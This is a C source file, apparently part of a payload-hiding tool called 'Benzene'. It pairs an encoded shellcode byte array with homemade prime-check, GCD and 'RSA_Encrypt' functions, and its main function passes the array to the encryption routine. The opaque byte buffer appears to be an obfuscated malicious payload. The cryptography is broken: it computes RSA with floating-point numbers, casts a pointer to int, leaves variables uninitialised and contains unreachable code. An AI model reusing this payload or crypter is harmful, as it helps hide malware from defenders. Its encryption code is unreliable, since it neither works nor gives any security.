/*
	Author:		lemur
	GitHub:		https://github.com/1emvr
	Email:		1emvr@protonmail.com
	Date:		01/04/2023	03:09 AM

	Functions for use in Benzene.
*/

const u_char buffer[] =
	"\xfd\x58\x81\xf5\xf3\xfa\xc4\x13\x05\x14\x47\x45\x46\x45"
	"\x5a\x47\x57\x58\x33\xc3\x66\x5a\x8f\x41\x65\x5c\x8d\x46"
	"\x1f\x5d\x83\x44\x21\x58\x89\x63\x53\x5a\x0b\xa4\x4f\x5e"
	"\x4b\x25\xce\x5d\x39\xd6\xad\x2c\x63\x6d\x01\x3e\x24\x52"
	"\xc4\xdd\x0b\x55\x06\xd4\xea\xfb\x53\x51\x53\x59\x88\x40"
	"\x24\x98\x47\x28\x4e\x15\xd7\x9e\x88\x9e\x01\x10\x02\x59"
	"\x86\xd2\x70\x74\x4d\x15\xd6\x44\x8c\x5d\x10\x52\x8a\x50"
	"\x22\x58\x02\xc2\xe7\x45\x4d\xeb\xcf\x55\x8c\x21\x80\x5e"
	"\x00\xc6\x4f\x20\xca\x5a\x35\xd3\xa9\x55\xc7\xdd\x0a\x54"
	"\x09\xd7\x39\xf0\x77\xe0\x4f\x11\x48\x37\x0d\x51\x3f\xc5"
	"\x72\xcd\x50\x52\x8a\x50\x26\x58\x02\xc2\x62\x52\x8e\x18"
	"\x4e\x50\x8c\x55\x14\x5f\x00\xc0\x43\x9a\x07\x9a\x4c\x12"
	"\xd5\x55\x5e\x55\x5f\x4b\x51\x4c\x40\x48\x43\x48\x42\x48"
	"\x4c\x90\xe9\x34\x47\x46\xf8\xf5\x50\x57\x58\x4a\x4a\x9a"
	"\x11\xfb\x53\xec\xfa\xeb\x5b\x5d\xb9\x62\x7b\x24\x5e\x23"
	"\x30\x11\x03\x53\x52\x5a\x8c\xf2\x4e\x95\xeb\xb5\x09\x16"
	"\x01\x59\x8b\xf4\x4a\xae\x06\x13\x1a\x85\xc6\xbc\x07\x1f"
	"\x49\x42\x48\x99\xe6\x5d\x8a\xe3\x45\xa9\x49\x63\x20\x13"
	"\xf8\xc0\x44\x9f\xeb\x78\x03\x10\x03\x12\x5d\x52\xbf\x3d"
	"\x86\x7f\x07\xea\xdd\x46\x51\x5d\x33\xd8\x4e\x23\xc4\x5b"
	"\xfa\xd4\x4e\x9d\xc5\x5d\xf7\xd6\x49\x99\xc3\x50\xb9\xf8"
	"\x0b\xcc\xe5\xeb\xd3\x5c\x8e\xd2\x62\x06\x40\x48\x4e\x98"
	"\xe1\x5a\x8d\xea\x44\xae\x9f\xb1\x73\x74\xf7\xc3\x49\x91"
	"\xc6\x51\x01\x12\x04\x5a\xbd\x77\x6b\x70\x07\x15\x08\x16"
	"\x01\x51\x52\x50\x53\x5a\x8d\xf1\x52\x43\x51\x59\x36\xd5"
	"\x62\x1b\x58\x51\x52\xf3\xff\x74\xc3\x57\x21\x40\x07\x15"
	"\x4f\x98\x4c\x32\x19\xd6\x02\x79\x4b\x9b\xe2\x45\x55\x55"
	"\x56\x55\x57\x54\x58\x5f\xfe\xd0\x43\x41\x4a\xed\xcc\x5e"
	"\x8c\xd5\x4a\x9d\xc6\x54\xb2\x6f\xcd\x2f\x84\xee\xd6\x5a"
	"\x35\xc1\x4d\xeb\xcc\x9f\x09\x54\xb2\x1e\x86\x0d\x62\xee"
	"\xd6\xa9\xf4\xa6\xa7\x42\x47\xae\xa1\x80\xb5\x8b\xfe\xc5"
	"\x4a\x92\xc7\x3a\x38\x15\x79\x1e\x86\xef\xe7\x60\x0d\xad"
	"\x46\x03\x70\x7e\x69\x12\x5d\x52\x8c\xce\xf9\xc1";

double is_prime_check(double p, double q) {

	bool is_prime = true;

	// Check not 0 or 1
	if (p == 0 || p == 1) {
		is_prime = false;
		return 0;
	}
	if (q == 0 || q == 1) {
		is_prime = false;
		return 0;
	}
	// Continue check for prime
	for (int i = 2; i <= p / 2; ++i) {
		if ((int)p % i == 0) {
			is_prime = false;
			return 0;
			break;
		}
	}
	for (int i = 2; i <= q / 2; ++i) {
		if ((int)q % i == 0) {
			is_prime = false;
			return 0;
			break;
		}
	}
	if (is_prime)
		return 1;

	/*
		Checking for prime numbers
	*/
}
int greatest_common_denominator(int a, int h) {
	
	// find gre
	while (1) {
		int temp = a % h;
		if (temp == 0)
			return h;

		a = h;
		h = temp;
	}
	return a, h;

	/*
		Find greatest common denominator between two numbers
	*/
}

unsigned char RSA_Encrypt(const u_char message[], int message_size, int p, int q) {

	double count;
	double N = p * q;
	double phi_N = (p - 1) * (q - 1);
	
	double public_key_e = 2;

	while (public_key_e < phi_N) {
		count = greatest_common_denominator(public_key_e, phi_N);

		if (count == 1)
			break;
		else
			public_key_e++;
	}
	double private_key_d;
	double private_key_k = 2;

	private_key_d = (1 + (private_key_k * phi_N)) / public_key_e;

	double ciphertext = pow((int) message, public_key_e);
	double plaintext = pow(ciphertext, private_key_d);

	ciphertext = fmod(ciphertext, N);
	return ciphertext;

	/*
		plaintext = fmod(plaintext, N);

		E must be greater than 1 and less then phi_N
		and Must also be coprime with N and phi_N
	*/
}

int main(int argc, char *argv[]) {

	int a;
	int h;
	int p;
	int q;

	RSA_Encrypt(buffer, sizeof(buffer), p, q);

	/*
	
	
	
	*/
}